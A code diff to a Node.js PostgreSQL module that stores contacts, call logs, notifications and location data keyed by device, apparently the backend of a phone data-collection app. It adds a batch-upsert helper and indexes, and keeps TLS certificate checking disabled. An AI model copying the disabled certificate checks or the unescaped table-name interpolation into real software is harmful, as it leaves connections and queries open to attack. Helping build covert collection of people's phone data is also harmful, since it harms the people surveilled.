@@ -3,6 +3,10 @@ const { Pool } = require('pg');
 
 let pool;
 
+// Connection pool config - pool size configurable via env var
+const POOL_MAX = parseInt(process.env.POOL_MAX || '15'); // Default 15
+const DB_TIMEOUT = parseInt(process.env.DB_TIMEOUT || '30000');
+
 function getPool() {
   if (!pool) {
     const connectionString = process.env.DATABASE_URL || 
@@ -11,18 +15,87 @@ function getPool() {
     pool = new Pool({
       connectionString,
       ssl: { rejectUnauthorized: false },
-      max: 10,
+      max: POOL_MAX,
       idleTimeoutMillis: 30000,
       connectionTimeoutMillis: 15000,
+      query_timeout: DB_TIMEOUT,
+      statement_timeout: DB_TIMEOUT * 1.5
     });
+    
+    pool.on('error', (err) => {
+      console.error('[DB] Unexpected pool error:', err.message);
+    });
+
+    console.log(`[DB] Connection pool created (max: ${POOL_MAX})`);
   }
   return pool;
 }
 
+// Batch upsert helper - processes items in chunks to reduce server load
+async function batchUpsert(table, columns, items, conflictColumns, updateColumns, onConflictAction = 'UPDATE') {
+  if (!items || items.length === 0) return { saved: 0, updated: 0, skipped: 0 };
+
+  const pool = getPool();
+  const client = await pool.connect();
+  let saved = 0;
+  let skipped = 0;
+
+  try {
+    // Process in chunks to avoid massive queries
+    const CHUNK_SIZE = 100;
+    for (let i = 0; i < items.length; i += CHUNK_SIZE) {
+      const chunk = items.slice(i, i + CHUNK_SIZE);
+      
+      // Build multi-row INSERT with parameterized values
+      const placeholders = [];
+      const values = [];
+      let paramIndex = 1;
+
+      for (const item of chunk) {
+        const rowPlaceholders = columns.map(col => `$${paramIndex++}`);
+        placeholders.push(`(${rowPlaceholders.join(', ')})`);
+        for (const col of columns) {
+          values.push(item[col] !== undefined ? item[col] : null);
+        }
+      }
+
+      // Build conflict resolution
+      const conflictTarget = conflictColumns.map(c => `"${c}"`).join(', ');
+      
+      let updateClause;
+      if (onConflictAction === 'UPDATE' && updateColumns && updateColumns.length > 0) {
+        const setClauses = updateColumns
+          .filter(col => conflictColumns.indexOf(col) === -1)
+          .map(col => `"${col}" = EXCLUDED."${col}"`);
+        updateClause = `DO UPDATE SET ${setClauses.join(', ')}, updated_at = CURRENT_TIMESTAMP`;
+      } else {
+        updateClause = 'DO NOTHING';
+      }
+
+      const query = `
+        INSERT INTO "${table}" (${columns.map(c => `"${c}"`).join(', ')})
+        VALUES ${placeholders.join(', ')}
+        ON CONFLICT (${conflictTarget})
+        ${updateClause}
+      `;
+
+      const result = await client.query(query, values);
+      saved += result.rowCount;
+    }
+
+    return { saved, updated: 0, skipped };
+  } catch (err) {
+    throw err;
+  } finally {
+    client.release();
+  }
+}
+
+// Initialize all database tables
 async function initDatabase() {
   const client = await getPool().connect();
   try {
-    // Create contacts table
+    // Create contacts table (dedup by device_id + contact_id)
     await client.query(`
       CREATE TABLE IF NOT EXISTS device_contacts (
         id SERIAL PRIMARY KEY,
@@ -39,9 +112,8 @@ async function initDatabase() {
         UNIQUE(device_id, contact_id)
       );
     `);
-    console.log('[DB] device_contacts table ready');
 
-    // Create call logs table with dedup: device_id + call_date + phone + type + duration
+    // Create call logs table (dedup by device_id + call_date + phone + type + duration)
     await client.query(`
       CREATE TABLE IF NOT EXISTS device_call_logs (
         id SERIAL PRIMARY KEY,
@@ -57,9 +129,8 @@ async function initDatabase() {
         UNIQUE(device_id, call_date, phone_number, call_type, duration_sec)
       );
     `);
-    console.log('[DB] device_call_logs table ready');
 
-    // Create notifications table with dedup: device_id + received_at + package + title
+    // Create notifications table (dedup by device_id + received_at + package + title)
     await client.query(`
       CREATE TABLE IF NOT EXISTS device_notifications (
         id SERIAL PRIMARY KEY,
@@ -74,9 +145,8 @@ async function initDatabase() {
         UNIQUE(device_id, received_at, package_name, title)
       );
     `);
-    console.log('[DB] device_notifications table ready');
 
-    // Create device info table (for GPS/location/status)
+    // Create device info table
     await client.query(`
       CREATE TABLE IF NOT EXISTS device_info (
         id SERIAL PRIMARY KEY,
@@ -87,21 +157,26 @@ async function initDatabase() {
         updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       );
     `);
-    console.log('[DB] device_info table ready');
 
-    // Create indexes for faster queries
-    await client.query(`
-      CREATE INDEX IF NOT EXISTS idx_contacts_device ON device_contacts(device_id);
-      CREATE INDEX IF NOT EXISTS idx_contacts_name ON device_contacts(name);
-      CREATE INDEX IF NOT EXISTS idx_calllogs_device ON device_call_logs(device_id);
-      CREATE INDEX IF NOT EXISTS idx_calllogs_date ON device_call_logs(call_date DESC);
-      CREATE INDEX IF NOT EXISTS idx_notifications_device ON device_notifications(device_id);
-      CREATE INDEX IF NOT EXISTS idx_notifications_time ON device_notifications(received_at DESC);
-      CREATE INDEX IF NOT EXISTS idx_deviceinfo_device ON device_info(device_id);
-    `);
-    console.log('[DB] Indexes created');
+    // Create optimized indexes for fast search
+    const indexes = [
+      'CREATE INDEX IF NOT EXISTS idx_contacts_device ON device_contacts(device_id)',
+      'CREATE INDEX IF NOT EXISTS idx_contacts_name ON device_contacts(name)',
+      'CREATE INDEX IF NOT EXISTS idx_contacts_phone ON device_contacts(phone)',
+      'CREATE INDEX IF NOT EXISTS idx_contacts_email ON device_contacts(email)',
+      'CREATE INDEX IF NOT EXISTS idx_calllogs_device ON device_call_logs(device_id)',
+      'CREATE INDEX IF NOT EXISTS idx_calllogs_date ON device_call_logs(call_date DESC)',
+      'CREATE INDEX IF NOT EXISTS idx_calllogs_phone ON device_call_logs(phone_number)',
+      'CREATE INDEX IF NOT EXISTS idx_notifications_device ON device_notifications(device_id)',
+      'CREATE INDEX IF NOT EXISTS idx_notifications_time ON device_notifications(received_at DESC)',
+      'CREATE INDEX IF NOT EXISTS idx_deviceinfo_device ON device_info(device_id)',
+    ];
 
-    console.log('[DB] All tables initialized successfully');
+    for (const idx of indexes) {
+      await client.query(idx);
+    }
+
+    console.log('[DB] All tables and indexes ready');
   } catch (err) {
     console.error('[DB] Table initialization error:', err.message);
     throw err;
@@ -110,4 +185,4 @@ async function initDatabase() {
   }
 }
 
-module.exports = { getPool, initDatabase };
+module.exports = { getPool, initDatabase, batchUpsert };
